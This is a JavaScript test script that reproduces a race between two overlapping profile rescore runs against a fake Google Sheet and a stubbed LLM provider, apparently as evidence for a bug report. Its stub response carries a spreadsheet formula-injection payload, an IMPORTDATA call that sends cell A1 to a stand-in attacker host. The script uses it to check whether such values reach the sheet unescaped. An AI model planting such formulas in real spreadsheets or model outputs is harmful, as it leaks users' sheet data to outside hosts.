// Lane F reproducer: two overlapping rescores against an in-memory Sheet and a
// stub chat provider. No network: globalThis.fetch is replaced before import.
// Run from the worktree root:
//   HOME="$PWD/.lane-evidence/home" node .lane-evidence/probes/F-rescore-overlap.mjs
const sheet = new Map(); // "H2" -> value
const writes = [];
let llmCalls = 0;
const rows = [1, 2, 3].map((n) => {
  const r = new Array(24).fill("");
  r[1] = `Role ${n}`; r[2] = `Co ${n}`; r[3] = "Remote"; r[4] = `http://127.0.0.1:18169/job/${n}`;
  return r;
});
const realFetch = globalThis.fetch;
globalThis.fetch = async (input, init = {}) => {
  const url = new URL(typeof input === "string" ? input : input.url ?? String(input));
  if (url.hostname === "sheets.googleapis.com") {
    if ((init.method || "GET") === "GET") {
      return new Response(JSON.stringify({ values: rows }), { status: 200 });
    }
    const body = JSON.parse(init.body);
    for (const d of body.data) sheet.set(d.range, d.values[0][0]);
    writes.push({ at: Date.now(), valueInputOption: body.valueInputOption, q: body.data.find((d) => d.range.includes("!Q"))?.values[0][0] });
    return new Response("{}", { status: 200 });
  }
  if (url.hostname === "stub-llm.invalid") {
    llmCalls += 1;
    const sys = JSON.parse(init.body).messages[0].content;
    const isA = sys.includes("PROFILE-A-OLD");
    await new Promise((r) => setTimeout(r, isA ? 400 : 20)); // old run is slow
    const content = JSON.stringify(isA
      ? { fitScore: 2, rationale: "old profile", leadAngle: "old angle" }
      : { fitScore: 9, rationale: "new profile", leadAngle: '=IMPORTDATA("https://attacker.invalid/?q="&A1)' });
    return new Response(JSON.stringify({ choices: [{ message: { content } }] }), { status: 200 });
  }
  throw new TypeError(`no-egress: ${url.hostname}`);
};

const { rescoreAllPipelineRows } = await import("../../server/profile-rescore-worker.mjs");
const { buildStarterTemplate, listStarterTemplateIds } = await import("../../server/user-profile.mjs");
const base = buildStarterTemplate(listStarterTemplateIds()[0]);
const profileA = structuredClone(base); profileA.identity.primaryNarrative = "PROFILE-A-OLD narrative";
const profileB = structuredClone(base); profileB.identity.primaryNarrative = "PROFILE-B-NEW narrative";
const providerConfig = { provider: "openai", apiKey: "probe-key", model: "probe-model", baseUrl: "http://stub-llm.invalid/v1" };
const common = { sheetId: "probe-sheet", providerConfig, overrideToken: "probe-token" };

console.log("t0: user saves profile A, clicks Rescore (run A)");
const runA = rescoreAllPipelineRows({ ...common, profile: profileA });
await new Promise((r) => setTimeout(r, 50));
console.log("t+50ms: user saves profile B, clicks Rescore again (run B) — no lock, both run");
const runB = rescoreAllPipelineRows({ ...common, profile: profileB });
const [a, b] = await Promise.all([runA, runB]);
console.log("run A result", JSON.stringify(a));
console.log("run B result", JSON.stringify(b));
console.log("LLM calls:", llmCalls, "Sheet batchUpdate writes:", writes.length, "valueInputOption:", [...new Set(writes.map((w) => w.valueInputOption))].join(","));
console.log("Final Fit Score cells (H2..H4):", ["H2", "H3", "H4"].map((c) => sheet.get(`Pipeline!${c}`)).join(", "), "<- profile B (newest) expected 9");
console.log("Final Talking Points Q2:", sheet.get("Pipeline!Q2") ?? "(A overwrote B)");
console.log("Talking Points values sent with USER_ENTERED, in write order:", JSON.stringify(writes.map((w) => w.q)));
globalThis.fetch = realFetch;
